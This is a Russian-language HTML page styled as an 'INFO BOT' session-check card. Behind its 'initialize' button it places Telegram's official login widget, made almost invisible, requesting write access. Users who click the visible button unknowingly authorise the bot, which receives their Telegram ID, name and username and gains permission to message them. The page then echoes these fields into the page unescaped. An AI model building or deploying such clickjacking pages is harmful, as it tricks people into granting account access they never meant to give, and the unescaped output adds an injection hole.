<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>INFO BOT</title>
    <style>
        :root {
            --blue: #0088cc;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: radial-gradient(circle at top right, #1e3a8a 0%, #020617 100%);
            font-family: 'Segoe UI', Tahoma, sans-serif;
            color: white;
            overflow: hidden;
        }

        /* Мягкое свечение на фоне */
        body::before {
            content: '';
            position: absolute;
            width: 500px;
            height: 500px;
            background: var(--blue);
            filter: blur(140px);
            border-radius: 50%;
            z-index: -1;
            opacity: 0.3;
        }

        .card {
            background: var(--glass);
            backdrop-filter: blur(35px);
            -webkit-backdrop-filter: blur(35px);
            border: 1px solid var(--border);
            border-radius: 30px;
            padding: 40px;
            width: 340px;
            text-align: center;
            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.6);
        }

        h2 { font-weight: 500; margin-bottom: 5px; color: #fff; letter-spacing: 0.5px; }
        p { opacity: 0.4; font-size: 13px; margin-bottom: 25px; }

        /* Контейнер кнопки */
        #auth-layer {
            position: relative;
            width: 100%;
            height: 50px;
        }

        /* Наша визуальная кнопка */
        .fake-btn {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: var(--blue);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            z-index: 1;
            pointer-events: none; /* Пропускает клик сквозь себя */
        }

        /* Скрытый официальный виджет поверх */
        #tg-widget-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0.01; /* Почти невидимый */
            z-index: 10;
            cursor: pointer;
            overflow: hidden;
        }

        #result {
            display: none;
            text-align: left;
            background: rgba(0,0,0,0.4);
            padding: 15px;
            border-radius: 15px;
            font-family: monospace;
            font-size: 13px;
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.2);
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="card">
    <h2>INFO BOT</h2>
    <p id="status">Требуется проверка сессии</p>
    
    <div id="auth-layer">
        <div class="fake-btn" id="btn-text">ИНИЦИАЛИЗИРОВАТЬ</div>
        
        <div id="tg-widget-overlay">
            <script async src="https://oauth.telegram.org/js/telegram-login.js?22" 
                data-telegram-login="8791295405" 
                data-size="large" 
                data-onauth="onTelegramAuth(user)" 
                data-request-access="write"></script>
        </div>
    </div>

    <div id="result"></div>
</div>

<script>
    function onTelegramAuth(user) {
        document.getElementById('auth-layer').style.display = 'none';
        document.getElementById('status').innerText = "Данные получены:";
        
        const res = document.getElementById('result');
        res.style.display = 'block';
        
        res.innerHTML = `
            ID: ${user.id}<br>
            FIRST: ${user.first_name}<br>
            LAST: ${user.last_name || '-'}<br>
            USER: @${user.username || 'n/a'}<br>
            <br>
            <span style="color: #4ade80;">> Доступ подтвержден.</span>
        `;
    }
</script>

</body>
</html>
